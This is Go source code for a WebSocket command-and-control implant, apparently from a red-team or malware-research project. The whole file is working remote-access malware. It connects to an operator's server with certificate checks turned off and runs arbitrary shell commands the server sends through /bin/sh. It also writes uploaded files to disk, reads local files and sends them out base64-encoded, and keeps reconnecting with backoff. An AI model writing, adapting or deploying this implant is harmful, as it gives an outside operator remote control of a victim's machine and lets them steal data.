package main

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/gorilla/websocket"

	"github.com/churchofmalware/c2-websocket-abuse/pkg"
)

// implant identity
type implant struct {
	id            string
	serverURL     string
	beaconSeconds int

	conn   *websocket.Conn
	connMu sync.Mutex
	done   chan struct{}
}

func (im *implant) connect() error {
	im.connMu.Lock()
	defer im.connMu.Unlock()

	if im.conn != nil {
		im.conn.Close()
	}

	tlsConfig := &tls.Config{
		InsecureSkipVerify: true, // accept self-signed certs
	}

	dialer := websocket.Dialer{
		TLSClientConfig: tlsConfig,
		HandshakeTimeout: 10 * time.Second,
	}

	conn, _, err := dialer.Dial(im.serverURL, nil)
	if err != nil {
		return fmt.Errorf("dial: %w", err)
	}

	im.conn = conn

	// Register immediately
	regMsg := protocol.NewMessage(protocol.TypeRegister, im.id, "")
	if err := conn.WriteJSON(regMsg); err != nil {
		conn.Close()
		im.conn = nil
		return fmt.Errorf("register: %w", err)
	}

	log.Printf("Connected to %s as %s", im.serverURL, im.id)
	return nil
}

func (im *implant) send(msg *protocol.Message) error {
	im.connMu.Lock()
	defer im.connMu.Unlock()
	if im.conn == nil {
		return fmt.Errorf("not connected")
	}
	return im.conn.WriteJSON(msg)
}

func (im *implant) sendResult(id, data string) {
	msg := protocol.NewResult(id, data)
	im.send(msg)
}

func (im *implant) sendError(id, errStr string) {
	msg := protocol.NewErrorMessage(id, errStr)
	im.send(msg)
}

func (im *implant) handleMessage(raw []byte) {
	msg, err := protocol.UnmarshalMessage(raw)
	if err != nil {
		log.Printf("Bad message: %v", err)
		return
	}

	switch msg.Type {
	case protocol.TypeExec:
		im.handleExec(msg)
	case protocol.TypeUpload:
		im.handleUpload(msg)
	case protocol.TypeDownload:
		im.handleDownload(msg)
	case protocol.TypeBeacon:
		im.handleBeacon(msg)
	case protocol.TypePing:
		im.handlePing(msg)
	case protocol.TypeExit:
		im.handleExit()
	case protocol.TypeHeartbeat:
		// Server sending heartbeat back — ignore, handled by ticker
	default:
		log.Printf("Unknown command type: %s", msg.Type)
	}
}

func (im *implant) handleExec(msg *protocol.Message) {
	cmdStr := strings.TrimSpace(msg.Data)
	if cmdStr == "" {
		im.sendError(msg.ID, "empty command")
		return
	}

	log.Printf("Executing: %s", cmdStr)

	var cmd *exec.Cmd
	if strings.ContainsAny(cmdStr, "|&;><$`\\") {
		// Complex shell — use sh -c
		cmd = exec.Command("/bin/sh", "-c", cmdStr)
	} else {
		parts := strings.Fields(cmdStr)
		if len(parts) == 0 {
			im.sendError(msg.ID, "empty command")
			return
		}
		cmd = exec.Command(parts[0], parts[1:]...)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		result := fmt.Sprintf("exit: %v\n%s", err, string(output))
		im.sendError(msg.ID, result)
		return
	}

	im.sendResult(msg.ID, string(output))
}

func (im *implant) handleUpload(msg *protocol.Message) {
	// Format: remote_path|base64data
	parts := strings.SplitN(msg.Data, "|", 2)
	if len(parts) != 2 {
		im.sendError(msg.ID, "invalid upload format")
		return
	}

	remotePath := parts[0]
	encoded := parts[1]

	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		im.sendError(msg.ID, fmt.Sprintf("base64 decode error: %v", err))
		return
	}

	if err := os.WriteFile(remotePath, data, 0644); err != nil {
		im.sendError(msg.ID, fmt.Sprintf("write file error: %v", err))
		return
	}

	im.sendResult(msg.ID, fmt.Sprintf("uploaded %s (%d bytes)", remotePath, len(data)))
}

func (im *implant) handleDownload(msg *protocol.Message) {
	remotePath := msg.Data
	data, err := os.ReadFile(remotePath)
	if err != nil {
		im.sendError(msg.ID, fmt.Sprintf("read file error: %v", err))
		return
	}

	encoded := base64.StdEncoding.EncodeToString(data)
	im.sendResult(msg.ID, fmt.Sprintf("%s|%s", remotePath, encoded))
}

func (im *implant) handleBeacon(msg *protocol.Message) {
	var seconds int
	if _, err := fmt.Sscanf(msg.Data, "%d", &seconds); err != nil || seconds < 1 {
		im.sendError(msg.ID, "invalid beacon interval")
		return
	}
	im.beaconSeconds = seconds
	im.sendResult(msg.ID, fmt.Sprintf("beacon interval set to %ds", seconds))
}

func (im *implant) handlePing(msg *protocol.Message) {
	pong := &protocol.Message{
		Type: protocol.TypePong,
		ID:   msg.ID,
		Data: "pong",
	}
	im.send(pong)
}

func (im *implant) handleExit() {
	log.Printf("Exit command received, disconnecting.")
	im.sendResult("", "disconnecting")
	// Close connection; reconnect loop will not restart
	close(im.done)
}

// heartbeatLoop sends periodic heartbeats.
func (im *implant) heartbeatLoop() {
	ticker := time.NewTicker(time.Duration(im.beaconSeconds) * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			heartbeat := protocol.NewMessage(protocol.TypeHeartbeat, im.id, "")
			if err := im.send(heartbeat); err != nil {
				log.Printf("Heartbeat send error: %v", err)
				return
			}
		case <-im.done:
			return
		}
	}
}

// readLoop reads messages from the WebSocket in a goroutine.
func (im *implant) readLoop() {
	defer func() {
		im.connMu.Lock()
		if im.conn != nil {
			im.conn.Close()
		}
		im.connMu.Unlock()
	}()

	for {
		select {
		case <-im.done:
			return
		default:
		}

		_, raw, err := im.conn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseNormalClosure) {
				log.Printf("Read error: %v", err)
			}
			return
		}

		// Handle ping frames
		if string(raw) == "keepalive" {
			continue
		}

		// Try JSON frame
		var js json.RawMessage
		if json.Unmarshal(raw, &js) != nil {
			continue // not JSON, skip
		}

		im.handleMessage(raw)
	}
}

func main() {
	serverURL := flag.String("server", "wss://127.0.0.1:8443/ws", "C2 server WebSocket URL")
	implantID := flag.String("id", "", "Implant ID (auto-generated if empty)")
	interval := flag.Int("interval", 60, "Heartbeat/beacon interval in seconds")
	flag.Parse()

	id := *implantID
	if id == "" {
		hostname, _ := os.Hostname()
		id = fmt.Sprintf("%s-%d", hostname, time.Now().UnixNano()%1000000)
	}

	im := &implant{
		id:            id,
		serverURL:     *serverURL,
		beaconSeconds: *interval,
		done:          make(chan struct{}),
	}

	// Handle OS signals
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	log.Printf("WebSocket Abuse C2 Implant starting")
	log.Printf("  ID:       %s", im.id)
	log.Printf("  Server:   %s", im.serverURL)
	log.Printf("  Interval: %ds", im.beaconSeconds)

	// Reconnect loop with exponential backoff
	backoff := 1 * time.Second
	maxBackoff := 60 * time.Second

	for {
		if err := im.connect(); err != nil {
			log.Printf("Connection failed: %v (retry in %v)", err, backoff)
			select {
			case <-time.After(backoff):
				backoff *= 2
				if backoff > maxBackoff {
					backoff = maxBackoff
				}
				continue
			case <-im.done:
				return
			}
		}
		backoff = 1 * time.Second // reset on successful connect

		// Start reader and heartbeat
		go im.readLoop()
		go im.heartbeatLoop()

		// Wait for disconnect or signal
		select {
		case <-sigCh:
			log.Printf("Signal received, shutting down.")
			close(im.done)
			im.connMu.Lock()
			if im.conn != nil {
				im.conn.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, "shutdown"))
				im.conn.Close()
			}
			im.connMu.Unlock()
			return
		case <-im.done:
			return
		}
	}
}
